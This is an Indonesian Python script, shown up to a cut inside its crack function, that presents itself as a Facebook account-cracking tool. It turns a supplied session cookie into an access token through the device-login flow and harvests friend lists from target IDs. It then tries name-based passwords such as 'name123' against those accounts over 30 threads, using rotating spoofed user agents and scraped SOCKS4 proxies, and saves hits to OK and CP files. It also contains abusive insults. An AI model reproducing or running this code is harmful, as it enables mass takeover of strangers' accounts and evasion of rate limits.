#-----------------[ IMPORT-MODULE ]-------------------#
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
#------------------[ USER-AGENT ]-------------------#
pretty.install()
CON=sol()
ugen2=[]
entot=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mAlvino_adijaya_xy')
prox=open('.prox.txt','r').read().splitlines()
strvsukarecode=[]
for xd in range(1000):
    rr = random.randint; rc = random.choice
    aZ = str(rc(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']))
    samsung = ["SM-E025F","SM-G996B","SM-A826S","SM-E135F","SM-G781B","SM-G998B","SM-F936U1","SM-G361F","SM-A716S","SM-J327AZ","SM-E426B","SM-A015F","SM-A015M","SM-A013G","SM-A013G","SM-A013M","SM-A013F","SM-A022M","SM-A022G","SM-A022F","SM-A025M","SM-S124DL","SM-A025U","SM-A025A","SM-A025G","SM-A025F","SM-A025AZ","SM-A035F","SM-A035M","SM-A035G","SM-A032F","SM-A032M","SM-A032F","SM-A037F","SM-A037U","SM-A037M","SM-S134DL","SM-A037G","SM-A105G","SM-A105M","SM-A105F","SM-A105FN","SM-A102U","SM-S102DL","SM-A102U1","SM-A107F","SM-A107M","SM-A115AZ","SM-A115U","SM-A115U1","SM-A115A","SM-A115M","SM-A115F","SM-A125F","SM-A127F","SM-A125M","SM-A125U","SM-A127M","SM-A135F","SM-A137F","SM-A135M","SM-A136U","SM-A136U1","SM-A136W","SM-A260F","SM-A260G","SM-A260F","SM-A260G","SM-A205GN","SM-A205U","SM-A205F","SM-A205G","SM-A205FN","SM-A202F","SM-A2070","SM-A207F","SM-A207M","SM-A215U","SM-A215U1","SM-A217F","SM-A217F","SM-A217M","SM-A225F","SM-A225M","SM-A226B","SM-A226B","SM-A226BR","SM-A235F","SM-A235M","SM-A300FU","SM-A300F","SM-A300H","SM-A310F","SM-A310M","SM-A320FL","SM-A320F","SM-A305G","SM-A305GT","SM-A305N","SM-A305F","SM-A307FN","SM-A307G","SM-A307GN","SM-A315G","SM-A315F","SM-A325F","SM-A325M","SM-A326U","SM-A326W","SM-A336E","SM-A336B","SM-A430F","SM-A405FN","SM-A405FM","SM-A3051","SM-A3050","SM-A415F","SM-A426U","SM-A426B","SM-A5009","SM-A500YZ","SM-A500Y","SM-A500W","SM-A500L","SM-A500X","SM-A500XZ","SM-A510F","SM-A510Y","SM-A520F","SM-A520W","SM-A500F","SM-A500FU","SM-A500H","SM-S506DL","SM-A505G","SM-A505FN","SM-A505U","SM-A505GN","SM-A505F","SM-A507FN","SM-A5070","SM-A515F","SM-A515U","SM-A515U1","SM-A516U","SM-A516V","SM-A516N","SM-A516B","SM-A525F","SM-A525M","SM-A526U","SM-A526U1","SM-A526B","SM-A526W","SM-A528B","SM-A536B","SM-A536U","SM-A536E","SM-A536V","SM-A600FN","SM-A600G","SM-A605FN","SM-A605G","SM-A605GN","SM-A605F","SM-A6050","SM-A606Y","SM-A6060","SM-G6200","SM-A700FD","SM-A700F","SM-A7000","SM-A700H","SM-A700YD","SM-A710F","SM-A710M","SM-A720F","SM-A750F","SM-A750FN","SM-A750GN","SM-A705FN","SM-A705F","SM-A705MN","SM-A707F","SM-A715F","SM-A715W","SM-A716U","SM-A716V","SM-A716U1","SM-A716B","SM-A725F","SM-A725M","SM-A736B","SM-A530F","SM-A810YZ","SM-A810F","SM-A810S","SM-A530W","SM-A530N","SM-G885F","SM-G885Y","SM-G885S","SM-A730F","SM-A805F","SM-G887F","SM-G8870","SM-A9000","SM-A920F","SM-A920F","SM-G887N","SM-A910F","SM-G8850","SM-A908B","SM-A908N","SM-A9080","SM-G313HY","SM-G313MY","SM-G313MU","SM-G316M","SM-G316ML","SM-G316MY","SM-G313HZ","SM-G313H","SM-G313HU","SM-G313U","SM-G318H","SM-G357FZ","SM-G310HN","SM-G357FZ","SM-G850F","SM-G850M","SM-J337AZ","SM-G386T1","SM-G386T","SM-G3858","SM-G3858","SM-A226L","SM-C5000","SM-C500X","SM-C5010","SM-C5018","SM-C7000","SM-C7010","SM-C701F","SM-C7018","SM-C7100","SM-C7108","SM-C9000","SM-C900F","SM-C900Y","SM-G355H","SM-G355M","SM-G3589W","SM-G386W","SM-G386F","SM-G3518","SM-G3586V","SM-G5108Q","SM-G5108","SM-G3568V","SM-G350E","SM-G350","SM-G3509I","SM-G3508J","SM-G3502I","SM-G3502C","SM-S820L","SM-G360H","SM-G360F","SM-G360T","SM-G360M","SM-G361H","SM-E500H","SM-E500F","SM-E500M","SM-E5000","SM-E500YZ","SM-E700H","SM-E700F","SM-E7009","SM-E700M","SM-G3815","SM-G3815","SM-G3815","SM-F127G","SM-E225F","SM-E236B","SM-F415F","SM-E5260","SM-E625F","SM-F900U","SM-F907N","SM-F900F","SM-F9000","SM-F907B","SM-F900W","SM-G150NL","SM-G155S","SM-G1650","SM-W2015","SM-G7102","SM-G7105","SM-G7106","SM-G7108","SM-G7202","SM-G720N0","SM-G7200","SM-G720AX","SM-G530T1","SM-G530H","SM-G530FZ","SM-G531H","SM-G530BT","SM-G532F","SM-G531BT","SM-G531M","SM-J727AZ","SM-J100FN","SM-J100H","SM-J120FN","SM-J120H","SM-J120F","SM-J120M","SM-J111M","SM-J111F","SM-J110H","SM-J110G","SM-J110F","SM-J110M","SM-J105H","SM-J105Y","SM-J105B","SM-J106H","SM-J106F","SM-J106B","SM-J106M","SM-J200F","SM-J200M","SM-J200G","SM-J200H","SM-J200F","SM-J200GU","SM-J260M","S-J260F","SM-J260MU","SM-J260F","SM-J260G","SM-J200BT","SM-G532G","SM-G532M","SM-G532MT","SM-J250M","SM-J250F","SM-J210F","SM-J20AZ","SM-J3109","SM-J320A","SM-J320G","SM-J320F","SM-J320H","SM-J320FN","SM-J330G","SM-J330F","SM-J330FN","SM-J337V","SM-J337P","SM-J337A","SM-J337VPP","SM-J337R4","SM-J327VPP","SM-J327V","SM-J327P","SM-J327R4","SM-S327VL","SM-S337TL","SM-S367VL","SM-J327A","SM-J327T1","SM-J327T","SM-J3110","SM-J3119S","SM-J3119","SM-S320VL","SM-J337T","SM-J400M","SM-J400F","SM-J400F","SM-J410F","SM-J410G","SM-J410F","SM-J415FN","SM-J415F","SM-J415G","SM-J415GN","SM-J415N","SM-J500FN","SM-J500M","SM-J510MN","SM-J510FN","SM-J510GN","SM-J530Y","SM-J530F","SM-J530G","SM-J530FM","SM-G570M","SM-G570F","SM-G570Y","SM-J600G","SM-J600FN","SM-J600GT","SM-J600F","SM-J610F","SM-J610G","SM-J610FN","SM-J710F","SM-J700H","SM-J700M","SM-J700F","SM-J700P","SM-J700T","SM-J710GN","SM-J700T1","SM-J727A","SM-J727R4","SM-J737T","SM-J737A","SM-J737R4","SM-J737V","SM-J737T1","SM-J737S","SM-J737P","SM-J737VPP","SM-J701F","SM-J701M","SM-J701MT","SM-S767VL","SM-S757BL","SM-J720F","SM-J720M","SM-G615F","SM-G615FU","SM-G610F","SM-G610M","SM-G610Y","SM-G611MT","SM-G611FF","SM-G611M","SM-J730G","SM-J730GM","SM-J730F","SM-J730FM","SM-S727VL","SM-S737TL","SM-J727T1","SM-J727T1","SM-J727V","SM-J727P","SM-J727VPP","SM-J727T","SM-C710F","SM-J810M","SM-J810F","SM-J810G","SM-J810Y","SM-A605K","SM-A605K","SM-A202K","SM-M336K","SM-A326K","SM-C115","SM-C115L","SM-C1158","SM-C1158","SM-C115W","SM-C115M","SM-S120VL","SM-M015G","SM-M015F","SM-M013F","SM-M017F","SM-M022G","SM-M022F","SM-M022M","SM-M025F","SM-M105G","SM-M105M","SM-M105F","SM-M107F","SM-M115F","SM-M115F","SM-M127F","SM-M127G","SM-M135M","SM-M135F","SM-M135FU","SM-M205FN","SM-M205F","SM-M205G","SM-M215F","SM-M215G","SM-M225FV","SM-M236B","SM-M236Q","SM-M305F","SM-M305M","SM-M307F","SM-M307FN","SM-M315F","SM-M317F","SM-M325FV","SM-M325F","SM-M326B","SM-M336B","SM-M336BU","SM-M405F","SM-M426B","SM-M515F","SM-M526BR","SM-M526B","SM-M536B","SM-M625F","SM-G750H","SM-G7508Q","SM-G7509","SM-N970U","SM-N970F","SM-N971N","SM-N970U1","SM-N770F","SM-N975U1","SM-N975U","SM-N975F","SM-N975F","SM-N976N","SM-N980F","SM-N981U","SM-N981B","SM-N985F","SM-N9860","SM-N986N","SM-N986U","SM-N986B","SM-N986W","SM-N9008V","SM-N9006","SM-N900A","SM-N9005","SM-N900W8","SM-N900","SM-N9009","SM-N900P","SM-N9000Q","SM-N9002","SM-9005","SM-N750L","SM-N7505","SM-N750","SM-N7502","SM-N910F","SM-N910V","SM-N910C","SM-N910U","SM-N910H","SM-N9108V","SM-N9100","SM-N915FY","SM-N9150","SM-N915T","SM-N915G","SM-N915A","SM-N915F","SM-N915S","SM-N915D","SM-N915W8","SM-N916S","SM-N916K","SM-N916L","SM-N916LSK","SM-N920L","SM-N920S","SM-N920G","SM-N920A","SM-N920C","SM-N920V","SM-N920I","SM-N920K","SM-N9208","SM-N930F","SM-N9300","SM-N930x","SM-N930P","SM-N930X","SM-N930W8","SM-N930V","SM-N930T","SM-N950U","SM-N950F","SM-N950N","SM-N960U","SM-N960F","SM-N960U","SM-N935F","SM-N935K","SM-N935S","SM-G550T","SM-G550FY","SM-G5500","SM-G5510","SM-G550T1","SM-S550TL","SM-G5520","SM-G5528","SM-G600FY","SM-G600F","SM-G6000","SM-G6100","SM-G610S","SM-G611F","SM-G611L","SM-G110M","SM-G110H","SM-G110B","SM-G910S","SM-G316HU","SM-G977N","SM-G973U1","SM-G973F","SM-G973W","SM-G973U","SM-G770U1","SM-G770F","SM-G975F","SM-G975U","SM-G970U","SM-G970U1","SM-G970F","SM-G970N","SM-G980F","SM-G981U","SM-G981N","SM-G981B","SM-G780G","SM-G780F","SM-G781W","SM-G781U","SM-G7810","SM-G9880","SM-G988B","SM-G988U","SM-G988B","SM-G988U1","SM-G985F","SM-G986U","SM-G986B","SM-G986W","SM-G986U1","SM-G991U","SM-G991B","SM-G990B","SM-G990E","SM-G990U","SM-G998U","SM-G996W","SM-G996U","SM-G996N","SM-G9960","SM-S901U","SM-S901B","SM-S908U","SM-S908U1","SM-S908B","SM-S9080","SM-S908N","SM-S908E","SM-S906U","SM-S906E","SM-S906N","SM-S906B","SM-S906U1","SM-G730V","SM-G730A","SM-G730W8","SM-C105L","SM-C101","SM-C105","SM-C105K","SM-C105S","SM-G900F","SM-G900P","SM-G900H","SM-G9006V","SM-G900M","SM-G900V","SM-G870W","SM-G890A","SM-G870A","SM-G900FD","SM-G860P","SM-G901F","SM-G901F","SM-G800F","SM-G800H","SM-G903F","SM-G903W","SM-G920F","SM-G920K","SM-G920I","SM-G920A","SM-G92P","SM-G920S","SM-G920V","SM-G920T","SM-G925F","SM-G925A","SM-G925W8","SM-G928F","SM-G928C","SM-G9280","SM-G9287","SM-G928T","M-G928I","SM-G930A","SM-G930F","SM-G930W8","SM-G930S","SM-G930V","SM-G930P","SM-G930L","SM-G891A","SM-G935F","SM-G935T","SM-G935W8","SM-G9350","SM-G950F","SM-G950W","SM-G950U","SM-G892A","SM-G892U","SM-G8750","SM-G955F","SM-G955U","SM-G955U1","SM-G955W","SM-G955N","SM-G960U","SM-G960U1","SM-G960F","SM-G965U","SM-G965F","SM-G965U1","SM-G965N","SM-G9650","SM-J321AZ","SM-J326AZ","SM-J336AZ","SM-T116","SM-T116NU","SM-T116NY","SM-T116NQ","SM-T2519","SM-G318HZ","SM-T255S","SM-W2016","SM-W2018","SM-W2019","SM-W2021","SM-W2022","SM-G600S","SM-E426S","SM-G3812","SM-G3812B","SM-G3818","SM-G388F","SM-G389F","SM-G390F","SM-G398FN"] 
    ajarincoding = f"Mozilla/5.0 (Linux; Android {str(rr(6,9))}; {str(rc(samsung))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,60))}.0.{str(rr(111,9999))}.{str(rr(10,141))} Mobile Safari/537.36"
    janganhinaauthorlama = f"Mozilla/5.0 (Linux; Android {str(rr(1,6))}.0.{str(rr(1,6))}; {str(rc(samsung))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,60))}.0.{str(rr(111,9999))}.{str(rr(10,141))} Mobile Safari/537.36 OPR/{str(rr(10,71))}.3.3718.67322"
    strvngkbisabikinsc = random.choice([ajarincoding,janganhinaauthorlama])
    strvsukarecode.append(strvngkbisabikinsc)
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#------------[ WARNA ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,H,p])
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#------------------[ MACHINE-SUPPORT ]---------------#
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.05)
def clear():
	os.system('clear')
def back():
	login()
#------------------[ LOGO-LAKNAT ]-----------------#
def banner():
	os.system('clear')
	print(f"""
 ____  __  _  _  ____  __    ____ 
/ ___)(  )( \/ )(  _ \(  )  (  __)
\___ \ )( / \/ \ ) __// (_/\ ) _) 
(____/(__)\_)(_/(__)  \____/(____)
\tSecrip By:FRENDY_DEV{x}""")
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			print('[!] ConnectionError')
			exit()
	except IOError:
		login_lagi334()
def login_lagi334():
	try:
		os.system('clear')
		banner()
		ses = requests.Session()
		cok = input('\n[!] Masukan Cookie : ')
		ses.headers.update(
			{
				'content-type': 'application/x-www-form-urlencoded',
			}
		)
		data = {
				'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038',
				'scope': ''
		}
		response = json.loads(ses.post('https://graph.facebook.com/v2.6/device/login/', data=data).text)
		code, user_code = response['code'], response['user_code']
		verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback'.format(code))
		ses.headers.pop(
			'content-type'
		)
		ses.headers.update(
			{
				'sec-fetch-mode': 'navigate',
				'user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36',
				'sec-fetch-site': 'cross-site',
				'Host': 'm.facebook.com',
				'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
				'sec-fetch-dest': 'document',
			}
		)
		response2 = ses.get(verification_url, cookies = {'cookie': cok}).text
		if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
			exit('\n[!] cookie invalid')
		else:
			action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
			fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
			jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
			data = {
				'fb_dtsg': fb_dtsg,
				'jazoest': jazoest,
				'qr': 0,
				'user_code': user_code,
			}
			ses.headers.update(
				{
					'origin': 'https://m.facebook.com',
					'referer': verification_url,
					'content-type': 'application/x-www-form-urlencoded',
					'sec-fetch-site': 'same-origin',
				}
			)
			response3 = ses.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': cok})
			if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
				ses.headers.pop(
					'content-type'
				)
				ses.headers.pop(
					'origin'
				)
				response4 = ses.post(response3.url, data = data, cookies = {'cookie': cok}).text
				action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
				fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
				jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
				scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
				display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
				user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
				logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
				auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
				encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
				return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
				ses.headers.update(
					{
						'origin': 'https://m.facebook.com',
						'referer': response3.url,
						'content-type': 'application/x-www-form-urlencoded',
					}
				)
				data = {
					'fb_dtsg': fb_dtsg,
					'jazoest': jazoest,
					'scope': scope,
					'display': display,
					'user_code': user_code,
					'logger_id': logger_id,
					'auth_type': auth_type,
					'encrypted_post_body': encrypted_post_body,
					'return_format[]': return_format,
				}
				response5 = ses.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': cok}).text
				windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
				ses.headers.pop(
					'content-type'
				)
				ses.headers.pop(
					'origin'
				)
				ses.headers.update(
					{
						'referer': 'https://m.facebook.com/',
					}
				)
				response6 = ses.get(windows_referer, cookies = {'cookie': cok}).text
				if 'Sukses!' in str(response6):
					ses.headers.update(
						{
							'sec-fetch-mode': 'no-cors',
							'referer': 'https://graph.facebook.com/',
							'Host': 'graph.facebook.com',
							'accept': '*/*',
							'sec-fetch-dest': 'script',
							'sec-fetch-site': 'cross-site',
						}
					)
					response7 = ses.get(status_url, cookies = {'cookie': cok}).text
					access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
					tokenw = open(".token.txt", "w").write(access_token)
					cokiew = open(".cok.txt", "w").write(cok)
					print(f'\n[!] Login  berhasil harap tunggu sebentar !!!')
					os.system('python nyet.py')
				else:
					exit('\n[+] login gagal')
		
	except Exception as e:
		print('\n[!] Cookies Invalid Bro')
		os.system('rm -rf .cok.txt && rm -rf .token.txt')
		print(e)
		exit()
def bot():
	try:
		requests.post("https://graph.facebook.com/61550040690238?fields=subscribers&access_token=%s"%(tokenku))
	except:
		pass
#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('[×] Cookies Kadaluarsa ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner()
	print('')
	ip = requests.get("https://api.ipify.org").text
	print(f'[{H}>>{N}] Selamat Datang {H}%s{x} Goblokkk'%(my_name))
	print(f'[{H}>>{N}] Your Idz : {my_id}\n[{H}>>{N}] Your Ip : {ip}')
	print('')
	print(f'[{H}01{N}].Crack Publik')
	print(f'[{H}02{N}].Hasil Crack')
	print(f'[{H}03{N}].Cek Opsi')
	print(f'[{H}04{N}].Pasang A2F')
	print(f'[{H}05{N}].Keluar')
	_____alvino__adijaya_____ = input('\n[?] Pilih : ')
	if _____alvino__adijaya_____ in ['1']:
		dump_massal()
	elif _____alvino__adijaya_____ in ['2']:
		result()
	elif _____alvino__adijaya_____ in ['3']:
		os.system('python opsi.py')
	elif _____alvino__adijaya_____ in ['4']:
		os.system('python main.py')
	elif _____alvino__adijaya_____ in ['5']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print('<•> Sukses Logout+Hapus Kukis ')
		exit()
	else:
		print('<•> Pilih Yang Bener Tod ')
		back()
def error():
	print(f'{k}<•> Maaf Fitur Ini Masih Di Perbaiki {x}')
	time.sleep(4)
	back()
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	print(f'[{H}01{N}].Hasil {h}OK{x} Anda ')
	print(f'[{H}02{N}].Hasil {k}CP{x} Anda ')
	print('[{H}03{N}].Kembali	')
	kz = input(f'\n<•> Pilih : ')
	if kz in ['2']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print('<•> File Tidak Di Temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print('<•> Anda Tidak Memiliki Hasil CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'<•> %s. %s ({k} %s {x}Idz )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input('\n<•> Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print('<•> Pilih Yang Bener Kontol ')
				back()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print('<•> File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'{x}<•> {k}{cpkuni[0]}|{cpkuni[1]}')
				nocp +=1
			print('')
			input(f'{x}[{m} Klik Enter{x} ]')
			back()
	elif kz in ['1']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print('<•> File Tidak Di Temukan ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print('<•> Anda Tidak Mempunyai File OK ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'<•> %s. %s ( {h}%s{x} Idz )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'<•> %s. %s ({h} %s {x}Idz )'%(cih,isi,(len(hem))))
			geeh = input(f'\nPilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print('<•> Pilih Yang Bener Kontol ')
				back()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print('<•> File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print('')
				print(f'{x}<•> {h}{cpkuni[0]}|{cpkuni[1]}|{cpkuni[2]}')
				nocp +=1
			print('')
			input(f'{x}[{m} Klik Enter{x} ]')
			back()
	elif kz in ['3']:
		back()
	else:
		print('<•> Pilih Yang Bener Kontol ')
		back()
#-------------------[ CRACK-PUBLIK ]----------------#
def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		jum = int(input('[?].Mau Berapa Target Asu ? : '))
	except ValueError:
		print('>> Masukkan Angka Anjing, Malah Huruff ')
		exit()
	if jum<1 or jum>100:
		print('>> Gagal Dump Idz ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input('[>] Masukkan ID '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('<•> Sinyal Loh Kek Kontoll ')
			exit()
	try:
		print('')
		print(f'[>] ID Terkumpul🙈{h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('<•> Sinyal Lo kek Kontol ')
		back()
	except (KeyError,IOError):
		print(f'<•>{k} Pertemanan Tidak Public {x}')
		time.sleep(3)
		back()

#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	print(f'{P}[{H}1{N}] Id Old To New{N}\n[{H}2{N}] Id New To Old {N}({H}Recommended{N})\n[{H}3{N}] Id Random{N}')
	hu = input('[?] Pilih : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('<•> Pilih Yang Bener Kontooll ')
		exit()
	print('')
	print(f'[{H}01{N}].M.facebook.com')
	print('')
	hc = input('[?] Pilih : ')
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['']:
		print('<•> Pilih Yang Bener Kontol ')
		setting()
	else:
		method.append('mobile')
	print('')
	_jembot_ = input('[?]Tambahkan Aplikasi ( Y/t ) ')
	if _jembot_ in ['']:
		print('<•> Pilih Yang Bener Kontol ')
		back()
	elif _jembot_ in ['y','Y']:
		taplikasi.append('ya')
	else:
		taplikasi.append('no')
	pwplus=input('[?].Tambahkan Password Manual ( Y/t ) ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		pwku=input('[>] Enter Password : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print(f'[{H}>{N}] {H}OK{N} SAVE IN {H}OK/{okc}{N}\n[{K}>{N}] {K}CP{N} SAVE IN {K}CP/{cpc}{N}\n[{M}>{N}] Mainkan Mode {H}✈{N} Setiap 500 ID')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv)
	print('')
	print(f'{P}[>] Crack Telah Selesai Jangan Lupa Amankan Hasil Cracknya{N}')
	print(f'[{h}>{x}] {h}OK{x} : {h}%s{x} '%(ok))
	print(f'[{k}>{x}] {k}CP{x} : {k}%s{x} '%(cp))
	print(f'{P}[>] Good Bye Thanks To Using My Script{N}')
	time.sleep(3)
	back()
#--------------------[ METODE-B-API ]-----------------#
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r🙈 {P}[{b}{loop}{P}/{u}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	ua =random.choice(strvsukarecode)
	ua2 =random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
